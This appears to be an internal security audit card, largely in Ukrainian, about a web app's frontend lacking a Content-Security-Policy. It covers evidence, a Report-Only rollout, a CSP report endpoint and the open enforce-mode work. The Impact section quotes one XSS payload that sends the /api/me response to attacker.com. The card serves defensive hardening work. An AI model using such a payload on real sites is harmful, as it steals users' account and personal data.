# C2 — Frontend SPA не має Content-Security-Policy

> **Last validated:** 2026-05-13 by @andrijvigrav. **Next review:** 2026-08-11.
> **Status:** In progress — Phase 1 (Report-Only canary + report sink + meta fallback) shipped 2026-05-04; Phase 2 (enforce mode + nonce flow) still open.

| Field              | Value                                                                                                   |
| ------------------ | ------------------------------------------------------------------------------------------------------- |
| **Severity**       | **Critical** (CVSS 8.8 — Universal-XSS exfiltration vector)                                             |
| **Sprint**         | [Sprint 1](./sprint-1.md)                                                                               |
| **Owner**          | frontend                                                                                                |
| **Effort**         | 0.5 person-day (Report-Only) + 1d опційно для Strict-CSP nonce-flow                                     |
| **Status**         | Phase 1 closed — Report-Only canary live; Phase 2 (enforce + nonce) tracked below                       |
| **Discovered**     | 2026-05-03                                                                                              |
| **Threat model**   | XSS Exfiltration → Account Compromise                                                                   |
| **Affected files** | `apps/web/vercel.json`, `vercel.json` (root), `apps/web/index.html`, `apps/server/src/http/security.ts` |

## Summary

`helmet.contentSecurityPolicy` додає `Content-Security-Policy` header **тільки до response-ів API**. Це коректно для JSON-API. Але SPA-фронтенд (`apps/web`) **не має жодного CSP** — ні через Vercel headers (`vercel.json`), ні через inline `<meta http-equiv="Content-Security-Policy" ...>` у `index.html`.

Це означає: будь-який майбутній XSS у SPA (через залежність, через user-content рендер у `claude-tracker` chat-message-і, через misconfigured library) → повний exfiltration без жодного браузерного guard-у.

## Evidence

```jsonc
// vercel.json (root) — є COOP/COEP/Permissions-Policy/X-Frame-Options, але НЕМАЄ CSP
[
  { "key": "Cross-Origin-Opener-Policy", "value": "same-origin" },
  { "key": "Cross-Origin-Embedder-Policy", "value": "require-corp" },
  {
    "key": "Permissions-Policy",
    "value": "camera=(), microphone=(), geolocation=()",
  },
  { "key": "X-Frame-Options", "value": "DENY" },
  // НЕМАЄ "Content-Security-Policy"
]
```

```html
<!-- apps/web/index.html — немає <meta http-equiv="Content-Security-Policy"> -->
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Sergeant</title>
<!-- ↑ після цього рядка одразу імпортується bundle -->
```

```ts
// apps/server/src/http/security.ts — CSP стоїть, але ТІЛЬКИ для API-response-ів
helmet({
  contentSecurityPolicy: { directives: { defaultSrc: ["'none'"], ... } },
  // ...
})
```

## Impact

1. **Universal-XSS exfiltration** — `<script>fetch("/api/me").then(r=>r.json()).then(s=>fetch("https://attacker.com",{method:"POST",body:JSON.stringify(s)}))</script>` — нічого не блокує.
2. **Sergeant обробляє фінансові дані** (Monobank, PrivatBank), персональні (вага, харчування, медичні замітки в `claude-tracker`). Без CSP `connect-src` обмеження браузер відправить будь-що куди завгодно.
3. **CSP — найдешевший single-shot захист від XSS**, який вже передбачений архітектурою (Vercel headers).
4. **Defense-in-depth gap** — навіть з добре написаним React-кодом, малий compromised dependency у вузькому supply-chain (наприклад, react-charting-library з 50K downloads/тиждень) запатчить себе у production без виявлення.

## Recommendation

### Phase 1 — CSP Report-Only (1–2 тижні)

Додати **`Content-Security-Policy-Report-Only`** з мінімально-обмежуючим policy-ом. Збирати reports через `report-uri` → `/api/csp-report` endpoint на сервері (вже існує — перевірити). Після стабілізації false-positive-ів (PostHog session-recording, Sentry trace, Vercel Analytics) → перейти у **enforce-mode**.

```json
{
  "key": "Content-Security-Policy-Report-Only",
  "value": "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data:; connect-src 'self' https://api.<your-host> https://*.posthog.com https://*.ingest.sentry.io; frame-ancestors 'none'; base-uri 'none'; form-action 'self'; object-src 'none'; upgrade-insecure-requests; report-uri /api/csp-report"
}
```

### Phase 2 — Enforce + nonce (опційно)

- Викинути `'unsafe-inline'` для `style-src` після перевірки реальних source-map / Tailwind generated styles.
- Якщо Vite produces inline `<script>` blocks — додати `nonce` через build-time inject.
- Перевірити COEP-сумісність із Stripe/Google-Maps/PostHog session iframes.

### Defense-in-depth: meta-fallback

- Додати `<meta http-equiv="Content-Security-Policy" ...>` в `apps/web/index.html` як **fallback**, якщо Vercel headers не доїхали (rare edge-case).

## Correction points

| File                                                                     | Action                                                                                                                                           |
| ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| `apps/web/vercel.json` (або root `vercel.json` — див. [H7](./README.md)) | Додати `Content-Security-Policy-Report-Only` header (Report-Only spec вище).                                                                     |
| `apps/web/index.html:39–42`                                              | Додати fallback `<meta http-equiv="Content-Security-Policy" content="..." />` (нижчий пріоритет за Vercel headers, але страхує).                 |
| `apps/server/src/modules/csp-report/router.ts` (новий або existing)      | Перевірити, що `/api/csp-report` приймає JSON body, валідує, rate-limit-ить, і логує у `csp_violation_total{directive=...}` метрику.             |
| `apps/web/public/.well-known/csp-violations` (тимчасовий)                | Додатковий sink для legacy reporters (можна skip-нути, якщо Sentry приймає `Reporting-API`).                                                     |
| `apps/server/src/http/security.ts`                                       | Якщо CSP_DISABLE / CSP_REPORT_ONLY env-flags використовуються — синхронізувати поведінку server-side helmet з frontend (див. [M1](./README.md)). |

## Verification

1. **CSP report endpoint smoke** — дати CSP-report curl-ом, переконатись, що він записується у метрику.
2. **Production canary** — деплой Report-Only mode → 24h моніторинг `csp_violation_total` → корекція allowlist.
3. **Browser DevTools** — Network tab → Response Headers → `Content-Security-Policy-Report-Only: ...` присутній на root-route і на assets.
4. **Penetration test (manual)** — спробувати inject inline `<script>alert(1)</script>` через chat-message render або через `?next=...` deeplink → CSP-report має фіксувати спробу.

## Open questions

- Чи **PostHog session-recording** компатибельний з `script-src 'self'`? Перевірити docs (deprecated COEP-вимоги).
- Чи **Stripe** використовується в frontend? Якщо так — `connect-src https://api.stripe.com https://m.stripe.com`, `frame-src https://js.stripe.com`, `script-src https://js.stripe.com`.
- Чи **Sentry session-replay** activated? Якщо так — окремі CSP-вимоги.
- Чи `'unsafe-eval'` потрібен для якоїсь wasm-залежності (Sentry profiling, image-codec, …)?

## Implementation log

| Date       | Event                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2026-05-03 | Card opened (Sprint 1).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 2026-05-04 | **Phase 1 shipped**: <ul><li>`Content-Security-Policy-Report-Only` already live in root `vercel.json`; updated `report-uri` from the placeholder Sentry stub to the real sink at `https://api.sergeant.app/api/csp-report`.</li><li>Added `POST /api/csp-report` endpoint in `apps/server/src/routes/csp-report.ts` + handler in `apps/server/src/modules/observability/csp-report.ts`. Accepts both legacy (`application/csp-report`) and Reporting-API (`application/reports+json`) wire formats. Per-IP rate-limit 120/min via `rateLimitExpress`. 5% sample-log to Pino.</li><li>New Prometheus counter `csp_violation_total{directive,disposition}` in `apps/server/src/obs/metrics.ts`. Cardinality bounded to ≈75 series via directive allowlist + `other`/`unknown` bucket.</li><li>Added defense-in-depth `<meta http-equiv="Content-Security-Policy">` fallback in `apps/web/index.html` for non-Vercel render paths (`file://`, dev preview without headers).</li><li>Body-size policy: dedicated `express.json` mounts on `/api/csp-report` for both browser content-types, capped at 16 KB to match Sentry's CSP-ingest ceiling.</li><li>Test coverage: `apps/server/src/modules/observability/csp-report.test.ts` (7 tests — legacy envelope, bare report, Reporting-API array, unknown-directive bucketing, effective-directive precedence, malformed payload tolerance, empty array).</li></ul> |

### Phase 2 — still open

The Phase-1 canary needs a **24-hour soak** in production before flipping
the header from `Content-Security-Policy-Report-Only` to enforced
`Content-Security-Policy`. Track Phase-2 closure under this card after:

1. `csp_violation_total` rate stabilises in Grafana (no novel directive
   firing for 7 days on the production rollout).
2. Allowlist is tightened (drop `'unsafe-inline'` from `style-src`, audit
   `'wasm-unsafe-eval'` need against the wasm-using deps in the bundle).
3. Vite is configured to inject a per-request `nonce` for any inline
   `<script>` blocks that survive the build step.
4. PostHog session-replay / Sentry session-replay compatibility re-tested
   with strict CSP — see _Open questions_ below.

## Cross-references

- [docs/security/hardening/sprint-1.md](./sprint-1.md) — sprint context.
- [docs/security/hardening/C1-mono-webhook-secret-in-url.md](./C1-mono-webhook-secret-in-url.md) — обидві Critical.
- [MDN: CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) — reference policy syntax.
- [OWASP Cheat Sheet: Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html).
